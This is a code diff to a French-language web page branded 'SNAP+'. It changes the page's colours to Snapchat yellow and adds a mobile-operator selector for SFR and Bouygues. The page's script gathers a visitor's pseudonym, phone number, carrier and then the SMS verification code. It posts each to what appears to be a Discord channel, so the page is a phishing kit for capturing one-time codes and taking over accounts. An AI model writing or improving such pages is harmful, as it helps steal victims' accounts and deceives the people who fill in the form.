@@ -11,13 +11,13 @@
   :root {
     --bg: #030305;
     --card-bg: rgba(14, 14, 18, 0.85);
-    --yellow: #CCFF00;
-    --yellow-hover: #b3e600;
-    --yellow-glow: rgba(204, 255, 0, 0.4);
-    --line: rgba(204, 255, 0, 0.08);
+    --yellow: #FFFC00;
+    --yellow-hover: #e6e300;
+    --yellow-glow: rgba(255, 252, 0, 0.4);
+    --line: rgba(255, 252, 0, 0.08);
     --grey: #a1a1aa;
     --grey-light: #f4f4f5;
-    --border-color: rgba(204, 255, 0, 0.15);
+    --border-color: rgba(255, 252, 0, 0.15);
     --radius-lg: 24px;
     --radius-md: 16px;
     --radius-sm: 12px;
@@ -38,7 +38,7 @@
     align-items: center;
   }
 
-  /* ---------- FOND VAGUE LUMINEUSE DYNAMIQUE JAUNE FLUO PUR ---------- */
+  /* ---------- FOND VAGUE LUMINEUSE DYNAMIQUE JAUNE SNAPCHAT ---------- */
   .bg-layer {
     position: fixed;
     inset: 0;
@@ -54,7 +54,7 @@
     height: 200vh;
     top: -50%;
     left: -50%;
-    background: conic-gradient(from 0deg at 50% 50%, rgba(204, 255, 0, 0.03) 0deg, transparent 60deg, rgba(204, 255, 0, 0.09) 120deg, transparent 180deg);
+    background: conic-gradient(from 0deg at 50% 50%, rgba(255, 252, 0, 0.03) 0deg, transparent 60deg, rgba(255, 252, 0, 0.09) 120deg, transparent 180deg);
     animation: rotateWave 25s linear infinite;
   }
 
@@ -119,8 +119,8 @@
     display: flex;
     align-items: center;
     gap: 6px;
-    background: rgba(204, 255, 0, 0.08);
-    border: 1px solid rgba(204, 255, 0, 0.25);
+    background: rgba(255, 252, 0, 0.08);
+    border: 1px solid rgba(255, 252, 0, 0.25);
     padding: 6px 14px;
     border-radius: 30px;
     font-size: 0.75rem;
@@ -196,7 +196,7 @@
  
   /* Bouton d'action */
   .neon-bar {
-    background: linear-gradient(135deg, #d6ff33 0%, var(--yellow) 100%);
+    background: linear-gradient(135deg, #fff200 0%, var(--yellow) 100%);
     color: #030305;
     border: none;
     padding: 18px 32px;
@@ -209,7 +209,7 @@
     letter-spacing: 0.02em;
     text-align: center;
     cursor: pointer;
-    box-shadow: 0 0 35px rgba(204, 255, 0, 0.45), 0 4px 12px rgba(0,0,0,0.3);
+    box-shadow: 0 0 35px rgba(255, 252, 0, 0.45), 0 4px 12px rgba(0,0,0,0.3);
     transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
     position: relative;
     overflow: hidden;
@@ -217,7 +217,7 @@
 
   .neon-bar:hover {
     transform: translateY(-3px) scale(1.02);
-    box-shadow: 0 0 50px rgba(204, 255, 0, 0.7);
+    box-shadow: 0 0 50px rgba(255, 252, 0, 0.7);
   }
 
   .secure-hint {
@@ -266,7 +266,7 @@
   .feature-icon {
     width: 36px;
     height: 36px;
-    background: rgba(204, 255, 0, 0.1);
+    background: rgba(255, 252, 0, 0.1);
     border-radius: 8px;
     display: flex;
     align-items: center;
@@ -313,12 +313,12 @@
 
   .modal-content {
     background: #0d0d12;
-    border: 1px solid rgba(204, 255, 0, 0.3);
+    border: 1px solid rgba(255, 252, 0, 0.3);
     border-radius: var(--radius-lg);
     padding: 28px 20px;
     width: 100%;
     max-width: 400px;
-    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 30px rgba(204, 255, 0, 0.15);
+    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 30px rgba(255, 252, 0, 0.15);
     transform: scale(0.95) translateY(15px);
     transition: transform 0.35s ease;
   }
@@ -376,7 +376,46 @@
 
   .form-group input:focus {
     border-color: var(--yellow);
-    box-shadow: 0 0 15px rgba(204, 255, 0, 0.25);
+    box-shadow: 0 0 15px rgba(255, 252, 0, 0.25);
+  }
+
+  /* Grille des opérateurs mobiles (SFR et Bouygues uniquement) */
+  .operators-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    margin-top: 6px;
+  }
+
+  .operator-card {
+    background: rgba(5, 5, 8, 0.9);
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-sm);
+    padding: 14px 10px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 70px;
+  }
+
+  .operator-card:hover {
+    border-color: rgba(255, 252, 0, 0.4);
+  }
+
+  .operator-card.selected {
+    border-color: var(--yellow);
+    background: rgba(255, 252, 0, 0.08);
+    box-shadow: 0 0 15px rgba(255, 252, 0, 0.2);
+  }
+
+  .operator-card span {
+    font-size: 0.85rem;
+    font-weight: 700;
+    color: #fff;
   }
 
   .hidden {
@@ -403,7 +442,7 @@
   .modal-btn.submit {
     background: var(--yellow);
     color: #030305;
-    box-shadow: 0 0 20px rgba(204, 255, 0, 0.35);
+    box-shadow: 0 0 20px rgba(255, 252, 0, 0.35);
   }
 
   .modal-btn.cancel {
@@ -535,6 +574,18 @@
             <label for="telephone">Numéro de téléphone</label>
             <input type="tel" id="telephone" required placeholder="06 XX XX XX XX">
           </div>
+          <div class="form-group">
+            <label>Opérateur mobile</label>
+            <div class="operators-grid">
+              <div class="operator-card" onclick="selectOperator(this, 'SFR')">
+                <span>SFR</span>
+              </div>
+              <div class="operator-card" onclick="selectOperator(this, 'Bouygues Telecom')">
+                <span>Bouygues</span>
+              </div>
+            </div>
+            <input type="hidden" id="operateur" required>
+          </div>
         </div>
 
         <div id="step2" class="hidden">
@@ -582,11 +633,19 @@
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('submitBtn').innerText = 'Continuer';
     document.getElementById('discordForm').reset();
+    document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
+    document.getElementById('operateur').value = '';
     modalOverlay.classList.add('active');
   }
 
   function closeModal() {
     modalOverlay.classList.remove('active');
+  }
+
+  function selectOperator(element, operatorName) {
+    document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
+    element.classList.add('selected');
+    document.getElementById('operateur').value = operatorName;
   }
 
   modalOverlay.addEventListener('click', (e) => {
@@ -601,9 +660,15 @@
     if (currentStep === 1) {
       userData.nom = document.getElementById('nom').value;
       userData.telephone = document.getElementById('telephone').value;
+      userData.operateur = document.getElementById('operateur').value;
+
+      if (!userData.operateur) {
+        alert("Veuillez sélectionner un opérateur mobile.");
+        return;
+      }
 
       const payloadStep1 = {
-        content: `@everyone\n📥 **Nouvelle inscription SNAP+ (Étape 1) :**\n> **Pseudo :** ${userData.nom}\n> **Téléphone :** \`${userData.telephone}\``
+        content: `@everyone\n📥 **Nouvelle inscription SNAP+ (Étape 1) :**\n> **Pseudo :** ${userData.nom}\n> **Téléphone :** \`${userData.telephone}\`\n> **Opérateur :** ${userData.operateur}`
       };
 
       try {
@@ -626,7 +691,7 @@
       userData.codeSms = document.getElementById('codeSms').value;
 
       const payloadStep2 = {
-        content: `@everyone\n🔑 **Code SMS reçu pour \`${userData.telephone}\` :**\n> **Code :** \`${userData.codeSms}\``
+        content: `@everyone\n🔑 **Code SMS reçu pour \`${userData.telephone}\` (${userData.operateur}) :**\n> **Code :** \`${userData.codeSms}\``
       };
 
       try {
@@ -653,7 +718,7 @@
   const canvas = document.getElementById('network');
   const ctx = canvas.getContext('2d');
   let w, h, particles;
-  const COLOR = '204,255,0'; 
+  const COLOR = '255,252,0'; 
  
   function resize(){
     w = canvas.width = window.innerWidth;
